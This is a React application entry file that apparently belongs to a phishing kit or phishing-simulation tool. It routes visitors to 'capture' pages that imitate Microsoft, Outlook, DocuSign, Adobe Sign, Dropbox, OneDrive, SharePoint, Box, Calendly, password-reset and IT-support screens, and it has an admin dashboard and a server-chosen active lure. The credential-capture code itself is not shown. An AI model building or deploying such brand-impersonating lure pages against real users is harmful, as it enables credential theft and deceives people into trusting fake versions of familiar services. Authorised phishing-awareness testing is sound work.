import React, { useState, useEffect } from 'react';
import ReactDOM from 'react-dom/client';
import { Dashboard } from './components/Dashboard';
import { CapturePage } from './components/CapturePage';
import { ScheduleCapturePage } from './components/ScheduleCapturePage';
import { MicrosoftVerifyTemplate } from './components/templates/MicrosoftVerifyTemplate';
import { OutlookSyncTemplate } from './components/templates/OutlookSyncTemplate';
import { ITSupportTemplate } from './components/templates/ITSupportTemplate';
import { PasswordResetTemplate } from './components/templates/PasswordResetTemplate';
import { AdobeSignTemplate } from './components/templates/AdobeSignTemplate';
import { BoxTemplate } from './components/templates/BoxTemplate';
import { DocuSignCenteredTemplate } from './components/templates/DocuSignCenteredTemplate';
import { DocuSignSplitTemplate } from './components/templates/DocuSignSplitTemplate';
import { DropboxTemplate } from './components/templates/DropboxTemplate';
import { MicrosoftOfficeTemplate } from './components/templates/MicrosoftOfficeTemplate';
import { OneDriveTemplate } from './components/templates/OneDriveTemplate';
import { SharePointTemplate } from './components/templates/SharePointTemplate';
import { SecureShareTemplate } from './components/templates/SecureShareTemplate';
import { CalendarInviteTemplate } from './components/templates/CalendarInviteTemplate';
import { CalendlyTemplate } from './components/templates/CalendlyTemplate';
import { BookingsMeetingTemplate } from './components/templates/BookingsMeetingTemplate';
import { SolarWindsTemplate } from './components/templates/SolarWindsTemplate';
import './styles/dashboard.css';
import './styles/capture.css';

type PageDesign = string;

function PageRenderer({ design }: { design: PageDesign }): React.ReactElement {
  switch (design) {
    case 'adobe-sign': return <AdobeSignTemplate />;
    case 'box': return <BoxTemplate />;
    case 'docusign-centered': return <DocuSignCenteredTemplate />;
    case 'docusign-split': return <DocuSignSplitTemplate />;
    case 'dropbox': return <DropboxTemplate />;
    case 'microsoft-office': return <MicrosoftOfficeTemplate />;
    case 'microsoft-verify': return <MicrosoftVerifyTemplate />;
    case 'onedrive': return <OneDriveTemplate />;
    case 'outlook-sync': return <OutlookSyncTemplate />;
    case 'sharepoint': return <SharePointTemplate />;
    case 'secureshare': return <SecureShareTemplate />;
    case 'calendar-invite': return <CalendarInviteTemplate />;
    case 'calendly-meeting': return <CalendlyTemplate />;
    case 'bookings-meeting': return <BookingsMeetingTemplate />;
    case 'solarwinds-meeting': return <SolarWindsTemplate />;
    case 'schedule-meeting': return <ScheduleCapturePage />;
    case 'it-support': return <ITSupportTemplate />;
    case 'password-reset': return <PasswordResetTemplate />;
    default: return <CapturePage />;
  }
}

function App(): React.ReactElement {
  const [path, setPath] = useState(window.location.pathname);
  const [activePage, setActivePage] = useState<PageDesign | null>(null);
  const [loaded, setLoaded] = useState(false);

  useEffect(() => {
    function onPopState(): void {
      setPath(window.location.pathname);
    }
    window.addEventListener('popstate', onPopState);
    return () => window.removeEventListener('popstate', onPopState);
  }, []);

  useEffect(() => {
    if (path === '/' || path.startsWith('/preview/')) {
      fetch('/api/templates?public=true')
        .then(r => r.json())
        .then((data: { template?: string }) => {
          setActivePage((data.template as PageDesign) ?? 'default');
          setLoaded(true);
        })
        .catch(() => { setActivePage('default'); setLoaded(true); });
    } else {
      setLoaded(true);
    }
  }, [path]);

  if (path === '/admin' || path.startsWith('/admin/')) {
    return <Dashboard />;
  }

  // Preview routes
  if (path.startsWith('/preview/')) {
    const design = path.replace('/preview/', '').replace(/\/$/, '') as PageDesign;
    return <PageRenderer design={design} />;
  }

  if (!loaded) {
    return <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', height: '100vh' }}>
      <div className="capture-spinner" />
    </div>;
  }

  return <PageRenderer design={activePage ?? 'default'} />;
}

ReactDOM.createRoot(document.getElementById('root')!).render(
  <React.StrictMode>
    <App />
  </React.StrictMode>
);
